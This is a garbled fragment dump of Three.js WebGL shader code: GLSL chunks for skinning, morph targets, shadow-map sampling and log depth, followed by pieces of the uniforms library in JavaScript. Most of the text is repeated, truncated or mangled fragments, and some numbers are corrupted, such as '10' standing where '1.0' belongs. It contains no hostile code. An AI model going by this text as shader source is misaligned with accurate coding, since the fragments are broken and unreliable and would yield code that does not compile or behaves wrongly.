boneTextureWidth 			float y = floor( j / float( boneTextureWidth ) );			float y = floor( j / float( boneTextureWidth ) ) j / float( boneTextureWidth )  j / float"\t\t\tflo ... dth );"			float dx = 1.0 / float( boneTextureWidth );			float dx = 10 / float"\t\t\tflo ... ght );"			float dy = 1.0 / float( boneTextureHeight );			float dy = 1( boneTextureHeight ) boneTextureHeight "\t\t\ty = ... 0.5 );"			y = dy * ( y + 0.5 );			y = dy( y + 0.5 ) y + 0.5  y5 "\t\t\tvec ... y ) );"			vec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );			vec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) ) boneTexture, vec2( dx * ( x + 0.5 ), y )  boneTexture, vec2( dx * ( x + 0.5 ), y ) dx * ( x + 0.5 ), y  dx( x + 0.5 ) x + 0.5  x, y 			vec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );			vec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) ) boneTexture, vec2( dx * ( x + 1.5 ), y ) ( dx * ( x + 1.5 ), y ) dx * ( x + 1.5 ), y ( x + 1.5 ) x + 1.5 			vec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );			vec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) ) boneTexture, vec2( dx * ( x + 2.5 ), y ) ( dx * ( x + 2.5 ), y ) dx * ( x + 2.5 ), y ( x + 2.5 ) x + 2.5 			vec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );			vec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) ) boneTexture, vec2( dx * ( x + 3.5 ), y ) ( dx * ( x + 3.5 ), y ) dx * ( x + 3.5 ), y ( x + 3.5 ) x + 3.5  3"\t\t\tmat ...  v4 );"			mat4 bone = mat4( v1, v2, v3, v4 );			mat4 bone = mat4( v1, v2, v3, v4 ) v1, v2, v3, v4 "\t\t\treturn bone;"			return bone;"\t\tunif ... NES ];"		uniform mat4 boneGlobalMatrices[ MAX_BONES ];		uniform mat4 boneGlobalMatrices[ MAX_BONES ]"\t\t\tmat ... (i) ];"			mat4 bone = boneGlobalMatrices[ int(i) ];			mat4 bone = boneGlobalMatrices[ int(i) ]skinbas ... n("\n")"\tmat4  ... x.x );"	mat4 boneMatX = getBoneMatrix( skinIndex.x );	mat4 boneMatX = getBoneMatrix( skinIndex.x ) skinIndex.x  skinIndexx "\tmat4  ... x.y );"	mat4 boneMatY = getBoneMatrix( skinIndex.y );	mat4 boneMatY = getBoneMatrix( skinIndex.y ) skinIndex.y "\tmat4  ... x.z );"	mat4 boneMatZ = getBoneMatrix( skinIndex.z );	mat4 boneMatZ = getBoneMatrix( skinIndex.z ) skinIndex.z z "\tmat4  ... x.w );"	mat4 boneMatW = getBoneMatrix( skinIndex.w );	mat4 boneMatW = getBoneMatrix( skinIndex.w ) skinIndex.w "\t#ifde ... ARGETS"	#ifdef USE_MORPHTARGETS"\tvec4  ... 1.0 );"	vec4 skinVertex = vec4( morphed, 1.0 );	vec4 skinVertex = vec4	vec4 skinVertex = vec4( position, 1.0 );"\tvec4  ... ght.x;"	vec4 skinned  = boneMatX * skinVertex * skinWeight.x;	vec4 skinned  = boneMatX skinVertex skinWeight"\tskinn ... ght.y;"	skinned      += boneMatY * skinVertex * skinWeight.y;	skinned     = boneMatYy;"\tskinn ... ght.z;"	skinned      += boneMatZ * skinVertex * skinWeight.z;= boneMatZz;"\tskinn ... ght.w;"	skinned      += boneMatW * skinVertex * skinWeight.w;= boneMatWmorphta ... n("\n")morphta ... _vertex"#ifdef ... ARGETS"#ifdef USE_MORPHTARGETS"\t#ifnd ... ORMALS"	#ifndef USE_MORPHNORMALS"\tunifo ... [ 8 ];"	uniform float morphTargetInfluences[ 8 ];	uniform float morphTargetInfluences[ 8 ]"\tunifo ... [ 4 ];"	uniform float morphTargetInfluences[ 4 ];[ 4 ]	vec3 morphed = vec3( 0.0 );	vec3 morphed = vec3"\tmorph ... [ 0 ];"	morphed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];	morphed= ( morphTarget0 - position ) morphTarget0 - position  morphTargetInfluences"\tmorph ... [ 1 ];"	morphed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];( morphTarget1 - position ) morphTarget1 - position "\tmorph ... [ 2 ];"	morphed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];( morphTarget2 - position ) morphTarget2 - position "\tmorph ... [ 3 ];"	morphed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];( morphTarget3 - position ) morphTarget3 - position [ 3 ]"\tmorph ... [ 4 ];"	morphed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];( morphTarget4 - position ) morphTarget4 - position "\tmorph ... [ 5 ];"	morphed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];( morphTarget5 - position ) morphTarget5 - position [ 5 ]"\tmorph ... [ 6 ];"	morphed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];( morphTarget6 - position ) morphTarget6 - position [ 6 ]"\tmorph ... [ 7 ];"	morphed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];( morphTarget7 - position ) morphTarget7 - position [ 7 ]"\tmorph ... ition;"	morphed += position;= position;default ... n("\n")vec4 mvPosition;"\tmvPos ... inned;"	mvPosition = modelViewMatrix * skinned;	mvPosition = modelViewMatrix"#if !d ... GETS )"#if !defined( USE_SKINNING ) && defined( USE_MORPHTARGETS )#if !defined && defined"\tmvPos ... 1.0 );"	mvPosition = modelViewMatrix * vec4( morphed, 1.0 );#if !defined( USE_SKINNING ) && ! defined( USE_MORPHTARGETS )	mvPosition = modelViewMatrix * vec4( position, 1.0 );"gl_Pos ... ition;"gl_Position = projectionMatrix * mvPosition; mvPosition;morphno ... n("\n")"#ifdef ... ORMALS"#ifdef USE_MORPHNORMALS	vec3 morphedNormal = vec3( 0.0 );	vec3 morphedNormal = vec3	morphedNormal +=  ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];	morphedNormal=  ( morphNormal0 - normal ) morphNormal0 - normal 	morphedNormal +=  ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];( morphNormal1 - normal ) morphNormal1 - normal 	morphedNormal +=  ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];( morphNormal2 - normal ) morphNormal2 - normal 	morphedNormal +=  ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];( morphNormal3 - normal ) morphNormal3 - normal "\tmorph ... ormal;"	morphedNormal += normal;= normal;skinnor ... n("\n")"\tmat4  ... eMatX;"	mat4 skinMatrix = skinWeight.x * boneMatX;	mat4 skinMatrix = skinWeight boneMatX;"\tskinM ... eMatY;"	skinMatrix 	+= skinWeight.y * boneMatY;	skinMatrix 	+= skinWeight boneMatY;"\tskinM ... eMatZ;"	skinMatrix 	+= skinWeight.z * boneMatZ; boneMatZ;"\tskinM ... eMatW;"	skinMatrix 	+= skinWeight.w * boneMatW; boneMatW;"\t#ifde ... ORMALS"	#ifdef USE_MORPHNORMALS	vec4 skinnedNormal = skinMatrix * vec4( morphedNormal, 0.0 );	vec4 skinnedNormal = skinMatrix( morphedNormal, 0.0 ) morphedNormal, 0.0  morphedNormal, 0	vec4 skinnedNormal = skinMatrix * vec4( normal, 0.0 );vec3 objectNormal;"\tobjec ... l.xyz;"	objectNormal = skinnedNormal.xyz;	objectNormal = skinnedNormal"#if !d ... MALS )"#if !defined( USE_SKINNING ) && defined( USE_MORPHNORMALS )( USE_MORPHNORMALS ) USE_MORPHNORMALS "\tobjec ... ormal;"	objectNormal = morphedNormal;#if !defined( USE_SKINNING ) && ! defined( USE_MORPHNORMALS )	objectNormal = normal;#ifdef FLIP_SIDED	objectNormal = -objectNormal;"vec3 t ... ormal;"vec3 transformedNormal = normalMatrix * objectNormal;vec3 transformedNormal = normalMatrixshadowm ... n("\n")shadowm ... ragment"#ifdef ... DOWMAP"#ifdef USE_SHADOWMAP"\tunifo ... OWS ];"	uniform sampler2D shadowMap[ MAX_SHADOWS ];	uniform sampler2D shadowMap[ MAX_SHADOWS ]W	uniform vec2 shadowMapSize[ MAX_SHADOWS ];	uniform vec2 shadowMapSize	uniform float shadowDarkness[ MAX_SHADOWS ];	uniform float shadowDarkness	uniform float shadowBias[ MAX_SHADOWS ];	uniform float shadowBias"\tvaryi ... OWS ];"	varying vec4 vShadowCoord[ MAX_SHADOWS ];	varying vec4 vShadowCoord"\tfloat ... th ) {"	float unpackDepth( const in vec4 rgba_depth ) {"\t\tcons ... 1.0 );"		const vec4 bit_shift = vec4( 1.0 / ( 256.0 * 256.0 * 256.0 ), 1.0 / ( 256.0 * 256.0 ), 1.0 / 256.0, 1.0 );		const vec4 bit_shift = vec4( 1.0 / ( 256.0 * 256.0 * 256.0 ), 1.0 / ( 256.0 * 256.0 ), 1.0 / 256.0, 1.0 ) 1.0 / ( 256.0 * 256.0 * 256.0 ), 1.0 / ( 256.0 * 256.0 ), 1.0 / 256.0, 1.0 0 / ( 256.0 * 256.0 * 256.0 ) 256.0 * 256.0 * 256.0  256( 256.0 * 256.0 ) 256.0 * 256.0 0 / 256"\t\tfloa ... ift );"		float depth = dot( rgba_depth, bit_shift );		float depth = dot( rgba_depth, bit_shift ) rgba_depth, bit_shift "\t\treturn depth;"		return depth;"\t#ifde ... _DEBUG"	#ifdef SHADOWMAP_DEBUG"\t\tvec3 ... rs[3];"		vec3 frustumColors[3];		vec3 frustumColors"\t\tfrus ... 0.0 );"		frustumColors[0] = vec3( 1.0, 0.5, 0.0 );		frustumColors[0] = vec3( 1.0, 0.5, 0.0 ) 1.0, 0.5, 0.0 0, 0"\t\tfrus ... 0.8 );"		frustumColors[1] = vec3( 0.0, 1.0, 0.8 );( 0.0, 1.0, 0.8 ) 0.0, 1.0, 0.8 8 "\t\tfrus ... 1.0 );"		frustumColors[2] = vec3( 0.0, 0.5, 1.0 );( 0.0, 0.5, 1.0 ) 0.0, 0.5, 1.0 5, 1"\t#ifde ... ASCADE"	#ifdef SHADOWMAP_CASCADE"\t\tint  ... t = 0;"		int inFrustumCount = 0;"\tfloat fDepth;"	float fDepth;"\tvec3  ... 1.0 );"	vec3 shadowColor = vec3( 1.0 );	vec3 shadowColor = vec3( 1.0 ) 1.0 	for( int i = 0; i < MAX_SHADOWS; i ++ ) {"\t\tvec3 ... i ].w;"		vec3 shadowCoord = vShadowCoord[ i ].xyz / vShadowCoord[ i ].w;		vec3 shadowCoord = vShadowCoordxyz / vShadowCoord"\t\tbvec ... 1.0 );"		bvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );		bvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 ) shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0  shadowCoordx >= 00, shadowCoordx <= 1y >= 0y <= 1"\t\tbool ... Vec );"		bool inFrustum = all( inFrustumVec );		bool inFrustum = all( inFrustumVec ) inFrustumVec "\t\t#ifd ... ASCADE"		#ifdef SHADOWMAP_CASCADE"\t\t\tinF ... tum );"			inFrustumCount += int( inFrustum );			inFrustumCount= int( inFrustum ) inFrustum "\t\t\tbve ... 1.0 );"			bvec3 frustumTestVec = bvec3( inFrustum, inFrustumCount == 1, shadowCoord.z <= 1.0 );			bvec3 frustumTestVec = bvec3( inFrustum, inFrustumCount == 1, shadowCoord.z <= 1.0 ) inFrustum, inFrustumCount == 1, shadowCoord.z <= 1.0  inFrustum, inFrustumCount == 1, shadowCoordz <= 1			bvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );			bvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 ) inFrustum, shadowCoord.z <= 1.0  inFrustum, shadowCoord		bool frustumTest = all( frustumTestVec );		bool frustumTest = all( frustumTestVec ) frustumTestVec "\t\tif ( ... st ) {"		if ( frustumTest ) {"\t\t\tsha ... [ i ];"			shadowCoord.z += shadowBias[ i ];			shadowCoord= shadowBias"\t\t\t#if ... _PCF )"			#if defined( SHADOWMAP_TYPE_PCF )			#if defined( SHADOWMAP_TYPE_PCF ) SHADOWMAP_TYPE_PCF "\t\t\t\tfl ... = 0.0;"				float shadow = 0.0;				float shadow = 0"\t\t\t\tco ... / 9.0;"				const float shadowDelta = 1.0 / 9.0;				const float shadowDelta = 10 / 9"\t\t\t\tfl ... i ].x;"				float xPixelOffset = 1.0 / shadowMapSize[ i ].x;				float xPixelOffset = 10 / shadowMapSize"\t\t\t\tfl ... i ].y;"				float yPixelOffset = 1.0 / shadowMapSize[ i ].y;				float yPixelOffset = 1"\t\t\t\tfl ... ffset;"				float dx0 = -1.25 * xPixelOffset;				float dx0 = -1 xPixelOffset;				float dy0 = -1.25 * yPixelOffset;				float dy0 = -1 yPixelOffset;				float dx1 = 1.25 * xPixelOffset;				float dx1 = 1				float dy1 = 1.25 * yPixelOffset;				float dy1 = 1"\t\t\t\tfD ... ) ) );"				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) );				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) ) texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) ( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 )  shadowMap, shadowCoord vec2( dx0, dy0 ) dx0, dy0 "\t\t\t\tif ... Delta;"				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;				if ( fDepth < shadowCoord.z ) fDepth < shadowCoord.z  fDepth < shadowCoord shadow= shadowDelta;				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) );( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) ) texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) ( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ( 0.0, dy0 ) 0.0, dy0 0, dy0 				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) );( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) ) texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) ( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ( dx1, dy0 ) dx1, dy0 				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) );( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) ) texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) ( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ( dx0, 0.0 ) dx0, 0.0  dx0, 0"\t\t\t\tfD ... y ) );"				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy ) );( texture2D( shadowMap[ i ], shadowCoord.xy ) ) texture2D( shadowMap[ i ], shadowCoord.xy ) ( shadowMap[ i ], shadowCoord.xy ) shadowMap[ i ], shadowCoord.xy xy 				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) );( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) ) texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) ( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ( dx1, 0.0 ) dx1, 0.0  dx1, 0				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) );( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) ) texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) ( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ( dx0, dy1 ) dx0, dy1 				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) );( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) ) texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) ( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ( 0.0, dy1 ) 0.0, dy1 0, dy1 				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) );( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) ) texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) ( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ( dx1, dy1 ) dx1, dy1 "\t\t\t\tsh ... w ) );"				shadowColor = shadowColor * vec3( ( 1.0 - shadowDarkness[ i ] * shadow ) );				shadowColor = shadowColor( ( 1.0 - shadowDarkness[ i ] * shadow ) ) ( 1.0 - shadowDarkness[ i ] * shadow ) ( 1.0 - shadowDarkness[ i ] * shadow ) 1.0 - shadowDarkness[ i ] * shadow 0 - shadowDarkness shadow "\t\t\t#el ... SOFT )"			#elif defined( SHADOWMAP_TYPE_PCF_SOFT )			#elif defined( SHADOWMAP_TYPE_PCF_SOFT ) SHADOWMAP_TYPE_PCF_SOFT 				float dx0 = -1.0 * xPixelOffset;				float dy0 = -1.0 * yPixelOffset;				float dx1 = 1.0 * xPixelOffset;				float dy1 = 1.0 * yPixelOffset;"\t\t\t\tma ... ernel;"				mat3 shadowKernel;				mat3 depthKernel;"\t\t\t\tde ... ) ) );"				depthKernel[0][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) );				depthKernel = unpackDepth				depthKernel[0][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) );				depthKernel[0][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) );				depthKernel[1][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) );"\t\t\t\tde ... y ) );"				depthKernel[1][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy ) );				depthKernel[1][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) );				depthKernel[2][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) );				depthKernel[2][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) );				depthKernel[2][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) );"\t\t\t\tve ... d.z );"				vec3 shadowZ = vec3( shadowCoord.z );				vec3 shadowZ = vec3( shadowCoord.z ) shadowCoord.z "\t\t\t\tsh ... wZ ));"				shadowKernel[0] = vec3(lessThan(depthKernel[0], shadowZ ));				shadowKernel(lessThan(depthKernel[0], shadowZ ))lessThan(depthKernel[0], shadowZ )(depthKernel[0], shadowZ )depthKernel[0], shadowZ depthKernel, shadowZ "\t\t\t\tsh ... 0.25);"				shadowKernel[0] *= vec3(0.25);= vec3(0.25)				shadowKernel[1] = vec3(lessThan(depthKernel[1], shadowZ ));(lessThan(depthKernel[1], shadowZ ))lessThan(depthKernel[1], shadowZ )(depthKernel[1], shadowZ )depthKernel[1], shadowZ 				shadowKernel[1] *= vec3(0.25);				shadowKernel[2] = vec3(lessThan(depthKernel[2], shadowZ ));(lessThan(depthKernel[2], shadowZ ))lessThan(depthKernel[2], shadowZ )(depthKernel[2], shadowZ )depthKernel[2], shadowZ 				shadowKernel[2] *= vec3(0.25);"\t\t\t\tve ... .xy );"				vec2 fractionalCoord = 1.0 - fract( shadowCoord.xy * shadowMapSize[i].xy );				vec2 fractionalCoord = 10 - fract( shadowCoord.xy * shadowMapSize[i].xy ) shadowCoord.xy * shadowMapSize[i].xy  shadowMapSize[i]"\t\t\t\tsh ... d.x );"				shadowKernel[0] = mix( shadowKernel[1], shadowKernel[0], fractionalCoord.x ); = mix( shadowKernel[1], shadowKernel[0], fractionalCoord.x ) shadowKernel[1], shadowKernel[0], fractionalCoord.x  shadowKernel, shadowKernel, fractionalCoord				shadowKernel[1] = mix( shadowKernel[2], shadowKernel[1], fractionalCoord.x );( shadowKernel[2], shadowKernel[1], fractionalCoord.x ) shadowKernel[2], shadowKernel[1], fractionalCoord.x "\t\t\t\tve ... alues;"				vec4 shadowValues;"\t\t\t\tsh ... d.y );"				shadowValues.x = mix( shadowKernel[0][1], shadowKernel[0][0], fractionalCoord.y );				shadowValuesx = mix( shadowKernel[0][1], shadowKernel[0][0], fractionalCoord.y ) shadowKernel[0][1], shadowKernel[0][0], fractionalCoord.y 				shadowValues.y = mix( shadowKernel[0][2], shadowKernel[0][1], fractionalCoord.y );y = mix( shadowKernel[0][2], shadowKernel[0][1], fractionalCoord.y ) shadowKernel[0][2], shadowKernel[0][1], fractionalCoord.y 				shadowValues.z = mix( shadowKernel[1][1], shadowKernel[1][0], fractionalCoord.y );z = mix( shadowKernel[1][1], shadowKernel[1][0], fractionalCoord.y ) shadowKernel[1][1], shadowKernel[1][0], fractionalCoord.y 				shadowValues.w = mix( shadowKernel[1][2], shadowKernel[1][1], fractionalCoord.y );w = mix( shadowKernel[1][2], shadowKernel[1][1], fractionalCoord.y ) shadowKernel[1][2], shadowKernel[1][1], fractionalCoord.y "\t\t\t\tsh ... 0 ) );"				shadow = dot( shadowValues, vec4( 1.0 ) );				shadow = dot( shadowValues, vec4( 1.0 ) ) shadowValues, vec4( 1.0 )  shadowValues, vec4				vec4 rgbaDepth = texture2D( shadowMap[ i ], shadowCoord.xy );				vec4 rgbaDepth = texture2D"\t\t\t\tfl ... pth );"				float fDepth = unpackDepth( rgbaDepth );				float fDepth = unpackDepth( rgbaDepth ) rgbaDepth "\t\t\t\tif ... rd.z )"				if ( fDepth < shadowCoord.z )"\t\t\t\t\ts ... i ] );"					shadowColor = shadowColor * vec3( 1.0 - shadowDarkness[ i ] );					shadowColor = shadowColor( 1.0 - shadowDarkness[ i ] ) 1.0 - shadowDarkness[ i ] "\t\t#ifd ... _DEBUG"		#ifdef SHADOWMAP_DEBUG"\t\t\t#if ... ASCADE"			#ifdef SHADOWMAP_CASCADE"\t\t\t\tif ... [ i ];"				if ( inFrustum && inFrustumCount == 1 ) gl_FragColor.xyz *= frustumColors[ i ];( inFrustum && inFrustumCount == 1 ) inFrustum && inFrustumCount == 1 = frustumColors				if ( inFrustum ) gl_FragColor.xyz *= frustumColors[ i ];"\t#ifde ... OUTPUT"	#ifdef GAMMA_OUTPUT"\t\tshad ... Color;"		shadowColor *= shadowColor;		shadowColor= shadowColor;	gl_FragColor.xyz = gl_FragColor.xyz * shadowColor; shadowColor;shadowm ... _vertex	uniform mat4 shadowMatrix[ MAX_SHADOWS ];	uniform mat4 shadowMatrix"\t\tvSha ... ition;"		vShadowCoord[ i ] = shadowMatrix[ i ] * worldPosition;		vShadowCoord = shadowMatrix worldPosition;alphate ... n("\n")#ifdef ALPHATEST"\tif (  ... scard;"	if ( gl_FragColor.a < ALPHATEST ) discard;	if ( gl_FragColor.a < ALPHATEST ) gl_FragColor.a < ALPHATEST a < ALPHATEST  discard;linear_ ... n("\n")linear_ ... ragment"#ifdef ... OUTPUT"#ifdef GAMMA_OUTPUT"\tgl_Fr ... xyz );"	gl_FragColor.xyz = sqrt( gl_FragColor.xyz );xyz = sqrt( gl_FragColor.xyz ) gl_FragColor.xyz logdept ... n('\n')logdept ... _vertex[\r\n\r\n\t\t ... n('\n')[\r\n\r\n\t\t ... ,\r\n\r\n\t]"#ifdef ... PTHBUF"#ifdef USE_LOGDEPTHBUF"\t\tvary ... Depth;"		varying float vFragDepth;"\tunifo ... BufFC;"	uniform float logDepthBufFC;logdept ... n("\n")"\tgl_Po ... BufFC;"	gl_Position.z = log2(max(1e-6, gl_Position.w + 1.0)) * logDepthBufFC;	gl_Positionz = log2(max(1e-6, gl_Position.w + 1.0))max(1e-6, gl_Position.w + 1.0)(1e-6, gl_Position.w + 1.0)1e-6, gl_Position.w + 1.01e-6, gl_Position logDepthBufFC;"\t\tvFra ... ion.w;"		vFragDepth = 1.0 + gl_Position.w;		vFragDepth = 1 gl_Position"\t\tgl_P ... ion.w;"		gl_Position.z = (gl_Position.z - 1.0) * gl_Position.w;		gl_Positionz = (gl_Position.z - 1.0)gl_Position.z - 1.0gl_Positionz - 1logdept ... ragment"\t\t#ext ... enable"		#extension GL_EXT_frag_depth : enable[\r\n\t\t"# ... n("\n")[\r\n\t\t"# ... \t].join[\r\n\t\t"# ... "\r\n\r\n\t]"#if de ... F_EXT)"#if defined(USE_LOGDEPTHBUF) && defined(USE_LOGDEPTHBUF_EXT)(USE_LOGDEPTHBUF)USE_LOGDEPTHBUF(USE_LOGDEPTHBUF_EXT)USE_LOGDEPTHBUF_EXT"\tgl_Fr ... * 0.5;"	gl_FragDepthEXT = log2(vFragDepth) * logDepthBufFC * 0.5;	gl_FragDepthEXT = log2(vFragDepth)vFragDepth logDepthBufFCTHREE.U ... }\r\n\r\n};THREE.U ... \t}\r\n\r\n}{\r\n\r\n\tm ... \t}\r\n\r\n}var u,  ... d = {};merged = {}for ( u ... \r\n\r\n\t\t}u < uniforms.lengthuniforms.lengthtmp = t ...  u ] );tmp = t ... [ u ] )this.cl ... [ u ] )this.cloneuniforms[ u ]merged[ ... p[ p ];merged[ ... mp[ p ]merged[ p ]tmp[ p ]return merged;var u,  ... t = {};uniforms_dst = {}uniform ... ] = {};uniform ...  ] = {}uniforms_dst[ u ]uniforms_src[ u ]paramet ... ][ p ];paramet ...  ][ p ]uniform ...  ][ p ]paramet ... Textureparamet ... Matrix4paramet ... Vector4paramet ... Vector3paramet ... Vector2paramet ... E.Coloruniform ... lone();uniform ... clone()paramet ... clone()parameter_src.cloneparamet ... f Arrayuniform ... lice();uniform ... slice()paramet ... slice()parameter_src.sliceuniform ... er_src;uniform ... ter_srcreturn uniforms_dst;THREE.UniformsLibcommon: ... }\r\n\r\n\t}"diffus ... eee ) }{ type: ... eee ) }type: "c"value:  ... eeeee )new THR ... eeeee )"map" : ...  null }"offset ... , 1 ) }{ type: ... , 1 ) }type: "v4""lightM ...  null }"specul ...  null }"envMap ...  null }"flipEn ... e: -1 }{ type: ... e: -1 }value: -1"useRef ... ue: 0 }{ type: ... ue: 0 }type: "i"value: 0"reflec ... : 1.0 }"refrac ...  0.98 }{ type: ...  0.98 }value: 0.98"combin ... ue: 0 }"morphT ... ue: 0 }"morphT ... uences"bump: { ... }\r\n\r\n\t}"bumpMa ...  null }"bumpSc ... ue: 1 }{ type: ... ue: 1 }value: 1normalm ... ) }\r\n\t}{\r\n\r\n\t\t ... ) }\r\n\t}"normal ...  null }"normal ... , 1 ) }type: "v2"fog : { ... }\r\n\r\n\t}"fogDen ... 00025 }{ type: ... 00025 }value: 0.00025"fogNea ... ue: 1 }"fogFar ...  2000 }{ type: ...  2000 }value: 2000"fogCol ... fff ) }{ type: ... fff ) }value:  ... fffff )lights: ... }\r\n\r\n\t}"ambien ... e: [] }{ type: ... e: [] }type: "fv"fvvalue: []"direct ... e: [] }"direct ... ection""direct ... tColor""hemisp ... e: [] }"hemisp ... ection""hemisp ... yColor""hemisp ... dColor""pointL ... e: [] }type: "fv1"fv1"spotLi ... e: [] }particl ... }\r\n\r\n\t}"psColo ... eee ) }"size"  ... : 1.0 }"scale" ... : 1.0 }shadowm ... }\r\n\r\n\t}"shadow ... e: [] }type: "tv"tvtype: "v2v"v2vtype: "m4v"m4v{\r\n\r\n\t' ... \t}\r\n\r\n}'basic' ... )\r\n\r\n\t}uniform ... \r\n\t\t] )THREE.U ... \r\n\t\t] )THREE.U ... s.merge[\r\n\r\n\t\t ... \r\n\r\n\t\t]THREE.U ... mmon" ]THREE.U ... "fog" ]THREE.U ... wmap" ]THREE.S ... rtex" ]"lightm ... vertex""morpht ... vertex""skinni ... vertex""shadow ... vertex""logdep ... vertex""\t#ifdef USE_ENVMAP"	#ifdef USE_ENVMAP"defaul ... vertex"THREE.S ... ment" ]"color_ ... agment""lightm ... agment""envmap ... agment""shadow ... agment""specul ... agment""logdep ... agment""\tgl_Fr ... ity );"	gl_FragColor = vec4( diffuse, opacity );	gl_FragColor = vec4( diffuse, opacity ) diffuse, opacity "linear ... agment"'lamber ... )\r\n\r\n\t}lambertTHREE.U ... ghts" ]"ambien ... fff ) }"emissi ... 000 ) }{ type: ... 000 ) }value:  ... 00000 )"wrapRG ... , 1 ) }type: "v3"#define LAMBERT"varyin ... Front;"varying vec3 vLightFront;"\tvaryi ... tBack;"	varying vec3 vLightBack;"lights ... vertex"	gl_FragColor = vec4( vec3( 1.0 ), opacity );( vec3( 1.0 ), opacity ) vec3( 1.0 ), opacity , opacity 